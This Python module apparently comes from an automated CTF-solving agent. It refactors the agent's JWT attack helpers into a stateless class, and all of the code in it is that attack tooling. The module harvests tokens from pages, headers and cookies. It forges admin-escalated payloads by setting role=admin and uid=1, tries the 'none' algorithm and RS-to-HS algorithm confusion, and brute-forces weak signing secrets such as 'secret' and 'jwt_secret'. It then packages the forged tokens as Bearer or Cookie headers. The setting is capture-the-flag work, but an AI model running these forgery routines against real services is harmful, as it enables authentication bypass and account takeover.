"""JWT candidate-collection / mutation / encoding cluster extracted from ctf_dispatcher.py.

L3h / Workstream A (object-ification, cut A): the JWT helper cluster (6 methods,
_collect_candidate_jwts .. _jwt_request_headers) is lifted into a single
independent, stateless ``JWTExecutor`` class. Method bodies are moved byte-for-byte;
the only behavioural inputs (the shared ``CTFState`` and the sibling
``_recent_local_source_hint_secret_candidates`` source-hint provider) are passed in
per call rather than read off ``self`` — ``JWTExecutor`` holds no eager state of its
own (``vars(JWTExecutor()) == {}``). The reason state/providers are injected per call
rather than stored is that the shared CTFState is swapped out on replay/fork, so a
stored reference would silently go stale.

``JWTExecutorMixin`` retains every method as a thin delegation shell with original
names + signatures (and original ``__module__`` anchoring), so the MRO and the sole
external call site (jwt_contact_chain.py) are unchanged. Pure code relocation,
near-zero risk.
"""

from __future__ import annotations

import re
from typing import Any, Callable, Optional

from .dispatcher_helpers import _jwt_encode


class JWTExecutor:
    """Stateless JWT discovery / payload-alg-secret candidate generation / headers.

    No instance state: ``state`` and the source-hint secret provider are supplied
    per call. ``vars(JWTExecutor()) == {}``.
    """

    def collect_candidate_jwts(
        self,
        target: str,
        page_features: dict[str, Any],
        *,
        state: Any | None,
    ) -> list[dict[str, Any]]:
        jwt_pattern = re.compile(
            r"(eyJ[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*)"
        )
        candidates: list[dict[str, Any]] = []
        seen_tokens: set[str] = set()

        def _add(token: str, *, source: str, location: str = "", header_name: str = "") -> None:
            normalized = str(token or "").strip()
            if not normalized or normalized in seen_tokens:
                return
            seen_tokens.add(normalized)
            candidates.append(
                {
                    "token": normalized,
                    "source": source,
                    "location": location,
                    "header_name": header_name,
                }
            )

        text_blobs = [
            str(page_features.get("content") or ""),
            str(page_features.get("html") or ""),
            str(page_features.get("headers") or ""),
            str(page_features.get("cookies") or ""),
            str(target or ""),
        ]
        if state is not None:
            for obs in state.observations:
                text_blobs.append(str(obs.value or ""))
                if isinstance(obs.metadata, dict):
                    for key in ("url", "final_url", "location"):
                        value = str(obs.metadata.get(key) or "").strip()
                        if value:
                            text_blobs.append(value)
            for artifact in state.artifacts:
                text_blobs.append(str(artifact.location or ""))
                if isinstance(artifact.metadata, dict):
                    text_blobs.append(str(artifact.metadata.get("content") or ""))

        for blob in text_blobs:
            for match in jwt_pattern.findall(str(blob or "")):
                _add(match, source="text")

        headers = page_features.get("response_headers") or page_features.get("headers") or {}
        if isinstance(headers, dict):
            for key, value in headers.items():
                text = str(value or "").strip()
                if not text:
                    continue
                bearer_match = re.search(
                    r"Bearer\s+(eyJ[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*\.[a-zA-Z0-9_\-]*)",
                    text,
                    re.IGNORECASE,
                )
                if bearer_match:
                    _add(
                        bearer_match.group(1),
                        source="header",
                        location="authorization",
                        header_name=str(key or "Authorization"),
                    )

        cookies_blob = str(page_features.get("cookies") or "")
        for cookie_part in cookies_blob.split(";"):
            if "=" not in cookie_part:
                continue
            name, value = cookie_part.split("=", 1)
            value = value.strip()
            if jwt_pattern.fullmatch(value):
                _add(value, source="cookie", location=name.strip())

        return candidates

    def jwt_mutation_candidates(self, payload: dict[str, Any]) -> list[dict[str, Any]]:
        base = dict(payload or {})
        variants: list[dict[str, Any]] = [dict(base)]
        elevated = dict(base)
        changed = False
        for key in ("role", "type", "scope", "user_role", "group"):
            if key in elevated:
                elevated[key] = "admin"
                changed = True
        for key in ("is_admin", "admin", "isAdmin", "superuser"):
            if key in elevated:
                elevated[key] = True
                changed = True
        for key in ("uid", "user_id", "id"):
            if key in elevated and str(elevated[key]) not in {"1", "admin"}:
                elevated[key] = 1
                changed = True
        if not changed:
            elevated["role"] = "admin"
            elevated["is_admin"] = True
        variants.append(elevated)
        return variants

    def jwt_algorithm_candidates(self, header: dict[str, Any]) -> list[str]:
        alg = str((header or {}).get("alg") or "").upper()
        candidates: list[str] = ["none"]
        if alg.startswith("HS"):
            candidates.append(alg)
        elif alg.startswith("RS"):
            candidates.extend(["HS256", "HS512"])
        else:
            candidates.extend(["HS256", "HS512"])
        ordered: list[str] = []
        for item in candidates:
            if item and item not in ordered:
                ordered.append(item)
        return ordered

    def jwt_secret_candidates(
        self,
        *,
        state: Any | None,
        source_hint_secrets: Optional[Callable[[], list[str]]] = None,
    ) -> list[str]:
        seeds = [
            "",
            "secret",
            "jwt_secret",
            "mysecret",
            "admin",
            "ctf",
            "flag",
            "tornado_secret",
        ]
        if state is not None:
            hint_secrets = source_hint_secrets() if source_hint_secrets is not None else []
            for candidate in hint_secrets:
                seeds.insert(0, candidate)
            for obs in state.observations:
                if obs.kind == "cookie_secret_leaked":
                    value = str(obs.value or "").strip()
                    if value:
                        seeds.insert(0, value)
        seen: set[str] = set()
        ordered: list[str] = []
        for item in seeds:
            if item in seen:
                continue
            seen.add(item)
            ordered.append(item)
        return ordered

    def encode_none_jwt(self, payload: dict[str, Any]) -> str:
        return _jwt_encode(payload, "", "none")

    def jwt_request_headers(
        self,
        candidate: dict[str, Any],
        token: str,
    ) -> list[dict[str, str]]:
        header_name = str(candidate.get("header_name") or "Authorization").strip() or "Authorization"
        location = str(candidate.get("location") or "").strip().lower()
        variants = [{header_name: f"Bearer {token}"}]
        if location:
            variants.append({"Cookie": f"{location}={token}"})
        else:
            variants.append({"Cookie": f"token={token}"})
        return variants


class JWTExecutorMixin:
    """JWT discovery, payload/alg/secret candidate generation and request headers.

    Thin delegation shells over the stateless ``JWTExecutor`` held by the dispatcher
    as ``self._jwt_executor``. Shells preserve the original names/signatures and feed
    the live dispatcher state (and the sibling source-hint provider) into the
    executor per call.
    """

    def _collect_candidate_jwts(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> list[dict[str, Any]]:
        return self._jwt_executor.collect_candidate_jwts(
            target, page_features, state=self.state
        )

    def _jwt_mutation_candidates(self, payload: dict[str, Any]) -> list[dict[str, Any]]:
        return self._jwt_executor.jwt_mutation_candidates(payload)

    def _jwt_algorithm_candidates(self, header: dict[str, Any]) -> list[str]:
        return self._jwt_executor.jwt_algorithm_candidates(header)

    def _jwt_secret_candidates(self) -> list[str]:
        return self._jwt_executor.jwt_secret_candidates(
            state=self.state,
            source_hint_secrets=self._recent_local_source_hint_secret_candidates,
        )

    def _encode_none_jwt(self, payload: dict[str, Any]) -> str:
        return self._jwt_executor.encode_none_jwt(payload)

    def _jwt_request_headers(
        self,
        candidate: dict[str, Any],
        token: str,
    ) -> list[dict[str, str]]:
        return self._jwt_executor.jwt_request_headers(candidate, token)
